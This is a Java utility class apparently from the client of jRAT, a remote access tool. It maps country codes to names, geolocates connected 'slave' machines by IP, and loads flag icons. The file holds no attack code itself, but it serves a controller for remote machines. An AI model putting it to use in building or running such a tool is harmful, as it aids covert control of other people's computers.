package se.jrat.client.utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import javax.swing.ImageIcon;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.Slave;
import se.jrat.client.ip2c.Country;
import se.jrat.client.ip2c.IP2Country;


public class FlagUtils {

	public static final HashMap<String, ImageIcon> FLAGS = new HashMap<String, ImageIcon>();
	public static final Map<String, String> COUNTRIES = new HashMap<String, String>();
	
	
	private static IP2Country ip2c;

	static {
		try {
			ip2c = new IP2Country("files/db.dat", IP2Country.MEMORY_MAPPED);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		COUNTRIES.put("AE", "United Arab Emirates");
		COUNTRIES.put("AF", "Afghanistan");
		COUNTRIES.put("AL", "Albania");
		COUNTRIES.put("AM", "Armenia");
		COUNTRIES.put("AO", "Angola");
		COUNTRIES.put("AR", "Argentina");
		COUNTRIES.put("AT", "Austria");
		COUNTRIES.put("AU", "Australia");
		COUNTRIES.put("AZ", "Azerbaijan");
		COUNTRIES.put("BA", "Bosnia and Herzegovina");
		COUNTRIES.put("BD", "Bangladesh");
		COUNTRIES.put("BE", "Belgium");
		COUNTRIES.put("BF", "Burkina Faso");
		COUNTRIES.put("BG", "Bulgaria");
		COUNTRIES.put("BI", "Burundi");
		COUNTRIES.put("BJ", "Benin");
		COUNTRIES.put("BN", "Brunei");
		COUNTRIES.put("BO", "Bolivia");
		COUNTRIES.put("BR", "Brazil");
		COUNTRIES.put("BT", "Bhutan");
		COUNTRIES.put("BW", "Botswana");
		COUNTRIES.put("BY", "Belarus");
		COUNTRIES.put("BZ", "Belize");
		COUNTRIES.put("CA", "Canada");
		COUNTRIES.put("CD", "Congo");
		COUNTRIES.put("CF", "Central African Republic");
		COUNTRIES.put("CG", "Congo");
		COUNTRIES.put("CH", "Switzerland");
		COUNTRIES.put("CI", "Ivory Coast");
		COUNTRIES.put("CL", "Chile");
		COUNTRIES.put("CM", "Cameroon");
		COUNTRIES.put("CN", "China");
		COUNTRIES.put("CO", "Colombia");
		COUNTRIES.put("CR", "Costa Rica");
		COUNTRIES.put("CU", "Cuba");
		COUNTRIES.put("CY", "Cyprus");
		COUNTRIES.put("CZ", "Czech Republic");
		COUNTRIES.put("DE", "Germany");
		COUNTRIES.put("DJ", "Djibouti");
		COUNTRIES.put("DK", "Denmark");
		COUNTRIES.put("DO", "Dominican Republic");
		COUNTRIES.put("DZ", "Algeria");
		COUNTRIES.put("EC", "Ecuador");
		COUNTRIES.put("EE", "Estonia");
		COUNTRIES.put("EG", "Egypt");
		COUNTRIES.put("EH", "Western Sahara");
		COUNTRIES.put("ER", "Eritrea");
		COUNTRIES.put("ES", "Spain");
		COUNTRIES.put("ET", "Ethiopia");
		COUNTRIES.put("FI", "Finland");
		COUNTRIES.put("FJ", "Fiji");
		COUNTRIES.put("FK", "Falkland Islands");
		COUNTRIES.put("FR", "France");
		COUNTRIES.put("GA", "Gabon");
		COUNTRIES.put("GB", "United Kingdom");
		COUNTRIES.put("GE", "Georgia");
		COUNTRIES.put("GF", "French Guiana");
		COUNTRIES.put("GH", "Ghana");
		COUNTRIES.put("GL", "Greenland");
		COUNTRIES.put("GM", "Gambia");
		COUNTRIES.put("GN", "Guinea");
		COUNTRIES.put("GQ", "Equatorial Guinea");
		COUNTRIES.put("GR", "Greece");
		COUNTRIES.put("GT", "Guatemala");
		COUNTRIES.put("GW", "Guinea-Bissau");
		COUNTRIES.put("GY", "Guyana");
		COUNTRIES.put("HN", "Honduras");
		COUNTRIES.put("HR", "Croatia");
		COUNTRIES.put("HT", "Haiti");
		COUNTRIES.put("HU", "Hungary");
		COUNTRIES.put("ID", "Indonesia");
		COUNTRIES.put("IE", "Ireland");
		COUNTRIES.put("IL", "Israel");
		COUNTRIES.put("IN", "India");
		COUNTRIES.put("IQ", "Iraq");
		COUNTRIES.put("IR", "Iran");
		COUNTRIES.put("IS", "Iceland");
		COUNTRIES.put("IT", "Italy");
		COUNTRIES.put("JM", "Jamaica");
		COUNTRIES.put("JO", "Jordan");
		COUNTRIES.put("JP", "Japan");
		COUNTRIES.put("KE", "Kenya");
		COUNTRIES.put("KG", "Kyrgyzstan");
		COUNTRIES.put("KH", "Cambodia");
		COUNTRIES.put("KP", "North Korea");
		COUNTRIES.put("KR", "Republic of Korea");
		COUNTRIES.put("KW", "Kuwait");
		COUNTRIES.put("KZ", "Kazakhstan");
		COUNTRIES.put("LA", "Laos");
		COUNTRIES.put("LB", "Lebanon");
		COUNTRIES.put("LK", "Sri Lanka");
		COUNTRIES.put("LR", "Liberia");
		COUNTRIES.put("LS", "Lesotho");
		COUNTRIES.put("LT", "Lithuania");
		COUNTRIES.put("LU", "Luxembourg");
		COUNTRIES.put("LV", "Latvia");
		COUNTRIES.put("LY", "Libya");
		COUNTRIES.put("MA", "Morocco");
		COUNTRIES.put("MD", "Moldova");
		COUNTRIES.put("MG", "Madagascar");
		COUNTRIES.put("MK", "Macedonia");
		COUNTRIES.put("ML", "Mali");
		COUNTRIES.put("MM", "Myanmar");
		COUNTRIES.put("MN", "Mongolia");
		COUNTRIES.put("MR", "Mauritania");
		COUNTRIES.put("MW", "Malawi");
		COUNTRIES.put("MX", "Mexico");
		COUNTRIES.put("MY", "Malaysia");
		COUNTRIES.put("MZ", "Mozambique");
		COUNTRIES.put("NA", "Namibia");
		COUNTRIES.put("NC", "New Caledonia");
		COUNTRIES.put("NE", "Niger");
		COUNTRIES.put("NG", "Nigeria");
		COUNTRIES.put("NI", "Nicaragua");
		COUNTRIES.put("NL", "Netherlands");
		COUNTRIES.put("NO", "Norway");
		COUNTRIES.put("NP", "Nepal");
		COUNTRIES.put("NZ", "New Zealand");
		COUNTRIES.put("OM", "Oman");
		COUNTRIES.put("PA", "Panama");
		COUNTRIES.put("PE", "Peru");
		COUNTRIES.put("PG", "Papua New Guinea");
		COUNTRIES.put("PH", "Philippines");
		COUNTRIES.put("PK", "Pakistan");
		COUNTRIES.put("PL", "Poland");
		COUNTRIES.put("PR", "Puerto Rico");
		COUNTRIES.put("PT", "Portugal");
		COUNTRIES.put("PY", "Paraguay");
		COUNTRIES.put("QA", "Qatar");
		COUNTRIES.put("RO", "Romania");
		COUNTRIES.put("RS", "Serbia");
		COUNTRIES.put("RU", "Russian Federation");
		COUNTRIES.put("RW", "Rwanda");
		COUNTRIES.put("SA", "Saudi Arabia");
		COUNTRIES.put("SB", "Solomon Islands");
		COUNTRIES.put("SD", "Sudan");
		COUNTRIES.put("SE", "Sweden");
		COUNTRIES.put("SJ", "Svalbard and Jan Mayen");
		COUNTRIES.put("SK", "Slovakia");
		COUNTRIES.put("SL", "Sierra Leone");
		COUNTRIES.put("SN", "Senegal");
		COUNTRIES.put("SO", "Somalia");
		COUNTRIES.put("SR", "Suriname");
		COUNTRIES.put("SV", "El Salvador");
		COUNTRIES.put("SY", "Syria");
		COUNTRIES.put("SZ", "Swaziland");
		COUNTRIES.put("TD", "Chad");
		COUNTRIES.put("TG", "Togo");
		COUNTRIES.put("TH", "Thailand");
		COUNTRIES.put("TJ", "Tajikistan");
		COUNTRIES.put("TL", "Timor-Leste");
		COUNTRIES.put("TM", "Turkmenistan");
		COUNTRIES.put("TN", "Tunisia");
		COUNTRIES.put("TR", "Turkey");
		COUNTRIES.put("TW", "Taiwan");
		COUNTRIES.put("TZ", "Tanzania");
		COUNTRIES.put("UA", "Ukraine");
		COUNTRIES.put("UG", "Uganda");
		COUNTRIES.put("US", "United States");
		COUNTRIES.put("UY", "Uruguay");
		COUNTRIES.put("UZ", "Uzbekistan");
		COUNTRIES.put("VA", "Vatican City");
		COUNTRIES.put("VE", "Venezuela");
		COUNTRIES.put("VN", "Viet Nam");
		COUNTRIES.put("VU", "Vanuatu");
		COUNTRIES.put("YE", "Yemen");
		COUNTRIES.put("ZA", "South Africa");
		COUNTRIES.put("ZM", "Zambia");
		COUNTRIES.put("ZW", "Zimbabwe");
	}
	
	public static String getStringFromIso2(String iso2) {
		return COUNTRIES.get(iso2.toUpperCase());
	}
	
	public static String getIso2FromString(String str) {
		for (String key : COUNTRIES.keySet()) {
			if (COUNTRIES.get(key).equalsIgnoreCase(str)) {
				return key.toLowerCase();
			}
		}
		
		return null;
	}

	public static Country getCountry(AbstractSlave abstractSlave) {
		return getCountry(abstractSlave.getRawIP());
	}

	public static Country getCountry(String ip) {
		Country country = null;

		try {
			country = ip2c.getCountry(ip);
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		return country;
	}

	public static ImageIcon getFlag(Slave s) {
		return FlagUtils.getFlag(s.getCountry());
	}

	public static ImageIcon getFlag(String name) {
		name = name.trim().toLowerCase();

		ImageIcon icon = null;

		try {
			if (name.equalsIgnoreCase("unknown")) {
				throw new Exception("Skip to error flag");
			}
			if (FLAGS.containsKey(name)) {
				icon = FLAGS.get(name);
			} else {
				icon = new ImageIcon(Main.class.getResource("/flags/" + name + ".png"));
				FLAGS.put(name, icon);
			}

		} catch (Exception e) {
			if (FLAGS.containsKey("unknown")) {
				icon = FLAGS.get("unknown");
			} else {
				icon = new ImageIcon(Main.class.getResource("/flags/unknown.png"));
				FLAGS.put("unknown", icon);
			}
		}
		return icon;
	}

	public static ImageIcon getRandomFlag() {
		List<String> list = new ArrayList<String>();
		list.add("blue");
		list.add("red");
		list.add("orange");
		list.add("white");
		list.add("green");
		int index = (new Random()).nextInt(list.size() - 1);
		return IconUtils.getIcon("flag_" + list.get(index), true);
	}

}
